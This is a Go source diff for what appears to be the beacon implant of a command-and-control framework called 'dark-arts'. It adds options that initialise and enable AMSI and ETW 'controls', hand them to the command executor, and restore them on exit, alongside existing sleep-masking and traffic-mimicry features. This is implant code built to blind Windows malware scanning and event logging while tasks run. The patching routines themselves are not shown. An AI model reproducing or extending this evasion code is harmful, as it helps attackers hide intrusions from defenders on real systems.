@@ -21,6 +21,7 @@ import (
 
 	"dark-arts/pkg/crypto"
 	"dark-arts/pkg/mimic"
+	"dark-arts/pkg/securityctl"
 	"dark-arts/pkg/sleepmask"
 	"dark-arts/pkg/tasking"
 )
@@ -41,6 +42,8 @@ type Config struct {
 	Mimic       bool
 	Noise       bool
 	SleepMask   bool
+	AMSI        bool
+	ETW         bool
 	StatePath   string
 	Log         *slog.Logger
 	Runner      Runner
@@ -60,6 +63,8 @@ type Beacon struct {
 	client   *http.Client
 	rotator  *mimic.Rotator
 	masker   *sleepmask.Masker
+	amsiCtrl securityctl.SecurityControl
+	etwCtrl  securityctl.SecurityControl
 	state    string
 	edges    []string
 	edgeIdx  int
@@ -140,6 +145,34 @@ func New(cfg Config) (*Beacon, error) {
 		}
 		b.masker = m
 	}
+	if cfg.AMSI {
+		ctrl := securityctl.NewAMSIControl()
+		if err := ctrl.Initialize(); err != nil {
+			b.log.Warn("amsi control init failed", "err", err)
+		} else {
+			b.amsiCtrl = ctrl
+			if err := ctrl.Enable(); err != nil {
+				b.log.Warn("amsi control enable failed", "err", err)
+			}
+			if exec, ok := b.runner.(*Executor); ok {
+				exec.amsiCtrl = ctrl
+			}
+		}
+	}
+	if cfg.ETW {
+		ctrl := securityctl.NewETWControl()
+		if err := ctrl.Initialize(); err != nil {
+			b.log.Warn("etw control init failed", "err", err)
+		} else {
+			b.etwCtrl = ctrl
+			if err := ctrl.Enable(); err != nil {
+				b.log.Warn("etw control enable failed", "err", err)
+			}
+			if exec, ok := b.runner.(*Executor); ok {
+				exec.etwCtrl = ctrl
+			}
+		}
+	}
 	return b, nil
 }
 
@@ -152,6 +185,12 @@ func (b *Beacon) Run(ctx context.Context) error {
 		return err
 	}
 	defer release()
+	if b.amsiCtrl != nil {
+		defer b.amsiCtrl.Restore()
+	}
+	if b.etwCtrl != nil {
+		defer b.etwCtrl.Restore()
+	}
 	b.log.Info("beacon starting", "sid", b.sid, "sleep", b.sleep.String(), "sleep_mask", b.masker != nil)
 	for {
 		if b.cfg.Noise && rand.Float64() < 0.3 {
@@ -473,4 +512,14 @@ func sleepSecondsFrom(res *tasking.Result) int {
 		return 0
 	}
 	return v.Seconds
+}
+
+// AMSICtrl returns the AMSI security-control, or nil if not configured.
+func (b *Beacon) AMSICtrl() securityctl.SecurityControl {
+	return b.amsiCtrl
+}
+
+// ETWCtrl returns the ETW security-control, or nil if not configured.
+func (b *Beacon) ETWCtrl() securityctl.SecurityControl {
+	return b.etwCtrl
 }
